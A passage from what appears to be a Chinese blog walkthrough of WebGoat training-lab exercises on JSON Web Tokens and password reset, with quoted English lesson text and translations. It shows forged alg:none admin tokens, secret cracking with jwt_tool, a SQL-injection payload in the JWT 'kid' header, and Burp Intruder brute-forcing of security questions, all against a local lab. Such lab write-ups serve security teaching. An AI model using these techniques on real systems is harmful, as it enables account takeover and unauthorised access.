class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>header部分最常用的两个字段是alg和typ。</p><p>alg属性表示token签名的算法(algorithm)，最常用的为HMAC和RSA算法</p><p>typ属性表示这个token的类型（type），JWT 令牌统一写为JWT。</p><h5 id="Payload">Payload</h5><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>除了官方字段，还可以在这个部分定义私有字段，以上面的例子为例，将 payload 部分解 base64 之后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTFHub&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：JWT 默认是不会对 Payload 加密的，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分</p></blockquote><h5 id="Signature">Signature</h5><p>Signature 部分是对前两部分的签名，防止数据篡改</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，<strong>使用 Header 里面指定的签名算法（默认是 HMAC SHA256）</strong>，按照下面的公式产生签名。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用&quot;点&quot;（.）分隔，就可以返回给用户。</p><p>参考链接</p><p><a href="https://jwt.io/introduction/">官网解释</a></p><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html"> 阮一峰老师亲作</a>(力推，写的很清晰)</p><p><a href="https://en.wikipedia.org/wiki/JSON_Web_Token">JSON Web Token - Wikipedia</a></p><ol start="3"><li></li></ol><p>这里直接解码就行了，可以用<a href="https://jwt.io/">JSON Web Tokens </a>的也可以用Webwolf自带的功能</p><h4 id="5-8">5.</h4><p>尝试更改您收到的令牌并通过更改令牌成为管理员用户，并在您成为管理员后重置投票</p><p>点击投票之后抓包</p><p>解码</p><p>头部的算法改成none</p><p>payload部分的admin：false改成true</p><p>两个部分用base64加密，加密后拼接在一起如下面的格式，记得小数点</p><blockquote><p>因为加密后会有=号，然后jwt需要把=去点</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciIDogIm5vbmUiCn0.ewogICJhZG1pbiIgOiAidHJ1ZSIsCiAgImlhdCIgOiAxNzA0ODc4MTY1LAogICJ1c2VyIiA6ICJUb20iCn0.</span><br></pre></td></tr></table></figure><p>改完发送就行了</p><h4 id="6-5">6.</h4><p>这是对第5题的解答？</p><p>Solution<br>The idea behind this assignment is that you can manipulate the token which might cause the server to interpret the token differently. In the beginning when JWT libraries appeared they implemented the specification to the letter meaning that the library took the algorithm specified inside the header and tried to work with it.</p><p>Signed JSON Web Tokens carry an explicit indication of the signing algorithm, in the form of the “alg” Header Parameter, to facilitate cryptographic agility. This, in conjunction with design flaws in some libraries and applications, has led to several attacks:</p><p>The algorithm can be changed to “none” by an attacker, and some libraries would trust this value and “validate” the JWT without checking any signature.</p><p>An “RS256” (RSA, 2048 bit) parameter value can be changed into “HS256” (HMAC, SHA-256), and some libraries would try to validate the signature using HMAC-SHA256 and using the RSA public key as the HMAC shared secret (see [McLean] and [CVE-2015-9235]).</p><p>For mitigations, see Sections 3.1 and 3.2.</p><p>— <a href="https://tools.ietf.org/html/rfc8725#section-2.1">https://tools.ietf.org/html/rfc8725#section-2.1</a><br>What basically happened was that libraries just parsed the token as it was given to them without validating what cryptographic operation was used during the creation of the token.</p><p>Solution<br>First note that we are logged in as so first select a different user for example: Tom. User Tom is allowed to vote as you can see, but he is unable to reset the votes. Looking at the request this will return an in the response:Guestaccess_token</p><p>GET <a href="http://localhost:8080/WebGoat/JWT/votings/login?user=Tom">http://localhost:8080/WebGoat/JWT/votings/login?user=Tom</a> HTTP/1.1</p><p>access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDgxMjg1NjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rTSX6PSXqUoGUvQQDBiqX0re2BSt7s2-X6FPf34Qly9SMpqIUSP8jykedJbjOBNlM3_CTjgk1SvUv48Pz8zIzA<br>Decoding the token gives:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS512&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;false&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can change the claim to but then signature will become invalid. How do we end up with a valid signature? Looking at the RFC specification is a valid choice and gives an unsecured JWT. Let’s change our token:adminfalsealg: none</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">headers:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;none&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">claims:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;true&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we use WebWolf to create our token we get:</p><p>eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2MDgxMjg1NjYsDQogICJ1c2VyIiA6ICJUb20iDQp9<br>Now we can replace the token in the cookie and perform the reset again. One thing to watch out for is to add a at the end otherwise the token is not valid…</p><p>溶液<br>此分配背后的想法是，您可以操作令牌，这可能会导致服务器以不同的方式解释令牌。一开始，当 JWT 库出现时，它们实现了规范，这意味着库采用了标头中指定的算法并尝试使用它。</p><p>签名的 JSON Web 令牌带有签名的显式指示 算法，以 “alg” Header Parameter 的形式，以方便 加密敏捷性。这与设计缺陷相结合 一些库和应用程序导致了几次攻击：</p><p>攻击者可以将该算法更改为“无”，并且某些算法 库将信任此值并“验证”JWT，而无需 检查任何签名。</p><p>“RS256”（RSA，2048 位）参数值可以更改为 “HS256”（HMAC、SHA-256），一些库会尝试验证 使用 HMAC-SHA256 并使用 RSA 公钥作为 HMAC 共享密钥（请参阅 [McLean] 和 [CVE-2015-9235]）。</p><p>有关缓解措施，请参阅第 3.1 节和第 3.2 节。</p><ul><li><a href="https://tools.ietf.org/html/rfc8725#section-2.1">https://tools.ietf.org/html/rfc8725#section-2.1</a><br>基本上发生的事情是，库只是在提供给他们的令牌时解析令牌，而没有验证在创建令牌期间使用的加密操作。</li></ul><p>溶液<br>首先请注意，我们已登录，因此首先选择其他用户，例如：Tom。 如您所见，用户 Tom 被允许投票，但他无法重置投票。查看请求，这将在响应中返回：Guestaccess_token</p><p>GET <a href="http://localhost:8080/WebGoat/JWT/votings/login?user=Tom">http://localhost:8080/WebGoat/JWT/votings/login?user=Tom</a> HTTP/1.1</p><p>access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDgxMjg1NjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rTSX6PSXqUoGUvQQDBiqX0re2BSt7s2-X6FPf34Qly9SMpqIUSP8jykedJbjOBNlM3_CTjgk1SvUv48Pz8zIzA<br>解码令牌给出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS512&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;false&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以将声明更改为，但签名将失效。我们如何最终获得有效的签名？ 查看 RFC 规范是一个有效的选择，并给出了一个不安全的 JWT。 让我们更改我们的令牌：adminfalsealg: none</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">headers:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;none&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">claims:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;true&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们使用 WebWolf 创建我们的令牌，我们会得到：</p><p>eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2MDgxMjg1NjYsDQogICJ1c2VyIiA6ICJUb20iDQp9<br>现在我们可以替换 cookie 中的令牌并再次执行重置。需要注意的一件事是在末尾添加 a，否则令牌无效。.</p><h4 id="7-3">7.</h4><p>查看parseClaimsJwt()的源码注释</p><p>Parses the specified compact serialized JWT string based on the builder’s current configuration state and returns the resulting unsigned plaintext JWT instance. This is a convenience method that is usable if you are confident that the compact string argument reflects an unsigned Claims JWT. An unsigned Claims JWT has a Claims body and it is not cryptographically signed. If the compact string presented does not reflect an unsigned Claims JWT, an UnsupportedJwtException will be thrown.</p><p>根据生成器的当前配置状态分析指定的紧凑序列化JWT字符串，并返回结果的无签名明文JWT实例。这是一个方便的方法，如果您确信紧凑字符串参数反映了未签名的声明JWT，则可以使用。未签名的索赔JWT具有索赔主体，并且它没有加密签名。如果提供的紧凑字符串不反映未签名的声明JWT，则将引发UnsupportedJwtException。<br>查看parse()的源码注释</p><p>Parses the specified compact serialized JWT string based on the builder’s current configuration state and returns the resulting JWT or JWS instance. This method returns a JWT or JWS based on the parsed string. Because it may be cumbersome to determine if it is a JWT or JWS, or if the body/payload is a Claims or String with instanceof checks, the #parse(String,JwtHandler) method allows for a type-safe callback approach that may help reduce code or instanceof checks.</p><p>根据生成器的当前配置状态分析指定的紧凑序列化JWT字符串，并返回结果的JWT或JWS实例。此方法根据解析的字符串返回JWT或JWS。由于确定它是JWT还是JWS，或者正文/有效负载是带有实例检查的声明或字符串可能会很麻烦，因此#解析（字符串，JwtHandler）方法允许一种类型安全的回调方法，这可能有助于减少代码或实例检查。</p><p>所以答案是</p><p>1</p><p>3</p><h4 id="8-2">8.</h4><p>这个需要找工具，可以用提示里面的hashcat</p><p>也可以用jwt-tools</p><p>我用的是jwt-tools，然后字典用提示里面的，下载命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/first20hours/google-10000-english</span><br></pre></td></tr></table></figure><p>命令如下，jwt记得换成自己的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py jwt -C -d 字典</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">参数-C表示对JWT进行压缩，以缩短字节长度。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">参数-d指定了一个字典文件，该文件包含用于尝试破解JWT的可能密钥列表。</span></span><br></pre></td></tr></table></figure><p>然后提示我的密钥是shipping</p><p>把密钥换上去，然后username换成WebGoat，还有就是时间问题</p><p>因为令牌都有自己的时间，如果不改的话会提示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT expired at 2023-12-31T16:31:50Z. Current time: 2023-12-31T18:47:35Z, a difference of 8145871 milliseconds. Allowed clock skew: 0 milliseconds.</span><br></pre></td></tr></table></figure><p>即过期了</p><p>exp尽量改大些就行了</p><ol start="9"><li></li></ol><p>Refreshing a token<br>Introduction<br>In this section we touch upon refreshing an access token.</p><p>Types of tokens<br>In general there are two types of tokens: an access token and a refresh token. The access token is used for making API calls towards the server. Access tokens have a limited life span, that’s where the refresh token comes in. Once the access token is no longer valid a request can be made towards the server to get a new access token by presenting the refresh token. The refresh token can expire but their life span is much longer. This solves the problem of a user having to authenticate again with their credentials. Whether you should use a refresh token and an access token depends, below can find a couple of points to keep in mind while choosing which tokens to use.</p><p>So a normal flow can look like:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H -d &#x27;username=webgoat&amp;password=webgoat&#x27; localhost:8080/WebGoat/login</span><br></pre></td></tr></table></figure><p>The server returns:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,</span><br><span class="line">    &quot;expires_in&quot;:10,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As you can see the refresh token is a random string which the server can keep track of (in memory or store in a database) in order to match the refresh token to the user the refresh token was granted to. So in this case whenever the access token is still valid we can speak of a “stateless” session, there is no burden on the server side to setup the user session, the token is self contained. When the access token is no longer valid the server needs to query for the stored refresh token to make sure the token is not blocked in any way.</p><p>Whenever the attacker gets a hold on an access token it is only valid for a certain amount of time (say 10 minutes). The attacker then needs the refresh token to get a new access token. That is why the refresh token needs better protection. It is also possible to make the refresh token stateless but this means it will become more difficult to see if the user revoked the tokens. After the server made all the validations it must return a new refresh token and a new access token to the client. The client can use the new access token to make the API call.</p><p>What should you check for?<br>Regardless of the chosen solution you should store enough information on the server side to validate whether the user is still trusted. You can think of many things, like store the ip address, keep track of how many times the refresh token is used (using the refresh token multiple times in the valid time window of the access token might indicate strange behavior, you can revoke all the tokens and let the user authenticate again). Also keep track of which access token belonged to which refresh token otherwise an attacker might be able to get a new access token for a different user with the refresh token of the attacker (see <a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/</a> for a nice write up about how this attack works) Also a good thing to check for is the ip address or geolocation of the user. If you need to give out a new token check whether the location is still the same if not revoke all the tokens and let the user authenticate again.</p><p>Need for refresh tokens<br>Does it make sense to use a refresh token in a modern single page application (SPA)? As we have seen in the section about storing tokens there are two options: web storage or a cookie which mean a refresh token is right beside an access token, so if the access token is leaked chances are the refresh token will also be compromised. Most of the time there is a difference of course. The access token is sent when you make an API call, the refresh token is only sent when a new access token should be obtained, which in most cases is a different endpoint. If you end up on the same server you can choose to only use the access token.</p><p>As stated above using an access token and a separate refresh token gives some leverage for the server not to check the access token over and over. Only perform the check when the user needs a new access token. It is certainly possible to only use an access token. At the server you store the exact same information you would store for a refresh token, see previous paragraph. This way you need to check the token each time but this might be suitable depending on the application. In the case the refresh tokens are stored for validation it is important to protect these tokens as well (at least use a hash function to store them in your database).</p><p>刷新令牌<br>介绍<br>在本节中，我们将介绍如何刷新访问令牌。</p><p>token类型<br>通常，有两种类型的令牌：访问令牌和刷新令牌。访问令牌用于制作 API 对服务器的调用。访问令牌的生命周期有限，这就是刷新令牌的用武之地。一次 访问令牌不再有效，可以向服务器发出请求，通过提供 刷新令牌。刷新令牌可能会过期，但其生命周期要长得多。这解决了用户的问题 必须使用其凭据再次进行身份验证。是否应使用刷新令牌和访问令牌取决于： 下面可以找到在选择要使用的令牌时要记住的几点。</p><p>因此，正常流程可能如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H -d &#x27;username=webgoat&amp;password=webgoat&#x27; localhost:8080/WebGoat/login</span><br></pre></td></tr></table></figure><p>服务器返回：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,</span><br><span class="line">    &quot;expires_in&quot;:10,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如您所见，刷新令牌是一个随机字符串，服务器可以跟踪它（在内存中或存储在数据库中） 为了将刷新令牌与用户匹配，已向其授予刷新令牌。 因此，在这种情况下，只要访问令牌仍然有效，我们就可以说是“无状态”会话，有 服务器端没有设置用户会话的负担，令牌是自包含的。 当访问令牌不再有效时，服务器需要查询存储的刷新令牌，以确保令牌 不会以任何方式被阻止。</p><p>每当攻击者保留访问令牌时，它仅在一定时间（例如 10 分钟）内有效。这 然后，攻击者需要刷新令牌来获取新的访问令牌。这就是为什么刷新令牌需要更好的保护。 也可以使刷新令牌无状态，但这意味着如果 用户吊销了令牌。 服务器完成所有验证后，必须向客户端返回新的刷新令牌和新的访问令牌。这 客户端可以使用新的访问令牌进行 API 调用。</p><p>你应该检查什么？<br>无论选择哪种解决方案，您都应该在服务器端存储足够的信息，以验证用户是否 仍然值得信赖。你可以想到很多事情，比如存储IP地址，跟踪刷新多少次 使用令牌（在访问令牌的有效时间窗口内多次使用刷新令牌可能表示奇怪 行为，您可以撤销所有令牌并让用户再次进行身份验证）。 此外，还要跟踪哪个访问令牌属于哪个刷新令牌，否则攻击者可能会 能够使用攻击者的刷新令牌为其他用户获取新的访问令牌 （请参阅 <a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/%EF%BC%8C%E4%BA%86%E8%A7%A3%E6%9C%89%E5%85%B3%E6%AD%A4%E6%94%BB%E5%87%BB%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%E7%B2%BE%E5%BD%A9%E6%96%87%E7%AB%A0%EF%BC%89">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/，了解有关此攻击如何工作的精彩文章）</a> 另外，要检查的一件好事是用户的 IP 地址或地理位置。如果您需要发出新的令牌检查 位置是否仍然相同，如果没有，请撤销所有令牌并让用户再次进行身份验证。</p><p>需要刷新令牌<br>在新式单页应用程序 （SPA） 中使用刷新令牌是否有意义？正如我们在本节中看到的 关于存储令牌，有两个选项：Web 存储或 cookie，这意味着刷新令牌就在 访问令牌，因此，如果访问令牌泄露，刷新令牌也可能被泄露。大多数时候 当然是有区别的。访问令牌在进行 API 调用时发送，刷新令牌仅发送 何时应获取新的访问令牌，在大多数情况下，该令牌是不同的终结点。如果你最终得到同样的 服务器，您可以选择仅使用访问令牌。</p><p>如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些不检查的杠杆作用 一遍又一遍地访问令牌。仅当用户需要新的访问令牌时才执行检查。 当然，可以只使用访问令牌。在服务器上，您存储的信息与存储的信息完全相同 存储 有关刷新令牌，请参阅上一段。这样，您每次都需要检查令牌，但这可能会 根据应用而适用。如果存储刷新令牌用于验证，则保护这些令牌也很重要（至少 使用哈希函数将它们存储在数据库中）。</p><h4 id="10-3">10.</h4><p>就如同session会有存活时长一样，JWT的access_token也是有相类似的机制。session失活后，系统会要求用户再次身份验证，通过则重新颁发session；JWT则可使用refresh token去刷新access token而无需再次身份验证。<br>登陆获取 access token, refresh token</p><p>WebGoat中提到：</p><p>应在服务器端存储足够的信息，以验证用户是否仍然受信任。您可以考虑的事情有很多，比如存储IP地址，跟踪使用refresh token的次数（在access token的有效时间窗口中多次使用刷新令牌可能表示奇怪的行为，您可以撤销所有token，让用户再次进行身份验证）。还要跟踪哪个access token属于哪个refresh token，否则攻击者可能会使用攻击者的refresh token为其他用户获取新的access token，请参阅https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation,还可以检查用户的IP地址或地理位置。如果需要发出一个新的令牌，请检查位置是否仍然相同，如果不同，则撤销所有令牌，并让用户再次进行身份验证。</p><p>这段话中关键信息是，服务器中可能存在：未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh token去刷新B用户的access token。<br>WebGoat对于使用JWT的建议：</p><blockquote><p>使用jwt令牌的最佳位置是服务器之间的通信。在普通的web应用程序中，最好使用普通的旧cookies。</p></blockquote><p>根据题意，攻击者要利用Tom过期的刷新token来获取访问token，用Tom的账户购物</p><ul><li>如何使用刷新token：<a href="https://segmentfault.com/a/1190000013151506">https://segmentfault.com/a/1190000013151506</a></li><li>请求header信息中需要带上authorization: {$token}</li></ul><p>点击here可以看到log</p><p>里面有token</p><p>解码后可以知道是tom的</p><p>然后点击购买抓包</p><p>把token放在Authorization: 后面</p><p>发送到repeater模块可以知道这个token是过期的</p><blockquote><p>授权标头的一部分发送,这通常是使用Bearer令牌标准进行的，其中token以&quot;Bearer &quot;前缀开头，后跟实际的token值。</p></blockquote><p>我们修改时间</p><blockquote><ol><li>exp（Expiration Time）：表示令牌的过期时间。它是一个时间戳，表示令牌在何时过期。该时间戳是使用纪元（Epoch）时间表示的，通常是以秒为单位的整数。</li><li>iat（Issued At）：表示令牌的签发时间。它也是一个时间戳，表示令牌是在何时被签发的。同样，该时间戳也是使用纪元时间表示的。</li></ol></blockquote><p>换算规则比如是Unix时间戳-&gt;北京时间</p><p>即1526217811-&gt;2018-05-13 21:23:31</p><p>我就是尽量大些就行了，发送即可</p><h4 id="11-2">11.</h4><p>这题我看writeup需要看源码。。。能找出sql漏洞</p><p><a href="https://www.cnblogs.com/lusuo/p/17825090.html">webgoat _v8.1全流程通关 - 让-雅克-卢梭 - 博客园 (cnblogs.com)</a></p><p>点击删除，抓包，获取token</p><p>更新数据，看源码利用了kid存在sql注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot; : &quot;&#x27;;select &#x27;MQ==&#x27; from jwt_key --&quot;,</span><br><span class="line">  &quot;typ&quot; : &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;Email&quot; : &quot;jerry@webgoat.com&quot;,</span><br><span class="line">  &quot;Role&quot; : [ &quot;Cat&quot; ],</span><br><span class="line">  &quot;aud&quot; : &quot;webgoat.org&quot;,</span><br><span class="line">  &quot;exp&quot; : 5618905304,</span><br><span class="line">  &quot;iat&quot; : 5524210904,</span><br><span class="line">  &quot;iss&quot; : &quot;WebGoat Token Builder&quot;,</span><br><span class="line">  &quot;sub&quot; : &quot;jerry@webgoat.com&quot;,</span><br><span class="line">  &quot;username&quot; : &quot;Tom&quot;</span><br><span class="line">&#125;</span><br><span class="line">secert_key=1</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/31.png" alt=""></p><p>更换token就行了</p><h3 id="3-Password-reset">3.Password reset</h3><h4 id="2-6">2.</h4><p>Let’s first do a simple assignment to make sure you are able to read e-mails with WebWolf, first start WebWolf (see here) In the reset page below send an e-mail to (part behind the @ is not important) Open WebWolf and read the e-mail and login with your username and the password provided in the <a href="mailto:e-mail.username@webgoat.org">e-mail.username@webgoat.org</a></p><p>大概的意思就是叫你点击忘记密码用于重置密码，然后会发送一封mail给WebWolf，在WebWolf就可以看到你的新密码了，再回到登录页面重新输入账号和新密码就行了</p><h4 id="4-5">4.</h4><p>Security questions</p><p>This has been an issue and still is for a lot of websites, when you lost your password the website will ask you for a security question which you answered during the sign up process. Most of the time this list contains a fixed number of question and which sometimes even have a limited set of answers. In order to use this functionality a user should be able to select a question by itself and type in the answer as well. This way users will not share the question which makes it more difficult for an attacker.</p><p>One important thing to remember the answers to these security question(s) should be treated with the same level of security which is applied for storing a password in a database. If the database leaks an attacker should not be able to perform password reset based on the answer of the security question.</p><p>Users share so much information on social media these days it becomes difficult to use security questions for password resets, a good resource for security questions is: <a href="http://goodsecurityquestions.com/">http://goodsecurityquestions.com/</a><br>Assignment</p><p>Users can retrieve their password if they can answer the secret question properly. There is no lock-out mechanism on this ‘Forgot Password’ page. Your username is ‘webgoat’ and your favorite color is ‘red’. The goal is to retrieve the password of another user. Users you could try are: “tom”, “admin” and “larry”.</p><p>安全问题<br>这一直是一个问题，对于许多网站来说仍然是一个问题，当您丢失密码时，网站会询问您 对于您在注册过程中回答的安全问题。大多数情况下，此列表包含一个固定的 问题的数量，有时甚至有一组有限的答案。为了使用此功能 用户应该能够自行选择问题并输入答案。这样用户就不会共享 这个问题使攻击者更加困难。</p><p>要记住的一件重要事情是，这些安全问题的答案应该以相同级别的 用于在数据库中存储密码的安全性。如果数据库泄漏，攻击者应该无法 根据安全问题的答案执行密码重置。</p><p>如今，用户在社交媒体上分享如此多的信息，因此很难将安全问题用于密码 重置，安全问题的一个很好的资源是： <a href="http://goodsecurityquestions.com/">http://goodsecurityquestions.com/</a></p><p>分配<br>如果用户可以正确回答密码问题，则可以检索其密码。没有锁定机制 这个“忘记密码”页面。您的用户名是“webgoat”，您最喜欢的颜色是“红色”。目标是检索 其他用户的密码。您可以尝试的用户是：“tom”、“admin”和“larry”。</p><p>这题就是要在一直用户名的情况下搜寻“最喜欢的颜色”</p><p>所以我们直接burp抓包，加入Intruder模块进行爆破</p><p>还是和上面一样集束炸弹（第四个），对tom和最喜欢的颜色打上标记</p><p>在payload set 1 添加上tom admin 和 larry</p><p>set 2 加入颜色字典</p><blockquote><p>可以在这里下载👉https://gist.github.com/mordka/c65affdefccb7264efff77b836b5e717</p></blockquote><p>开始爆破后（可能需要多次才能获取答案），通过状态码（200）和length的不同寻找答案</p><blockquote><p>因为答案最多三个，然后我们找最不同的就行了</p></blockquote><p>最终找到admin:green,tom:purple,larry:yellow</p><h4 id="5-9">5.</h4><p>好像是叫选几个不容易被推断出答案的身份验证把。。。</p><p>这个自己选&gt;2个就行了</p><h4 id="6-6">6.</h4><p>先用自己的账号发送重置密码的链接</p><p>会收到一封信，信里有重置密码的链接，样式为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 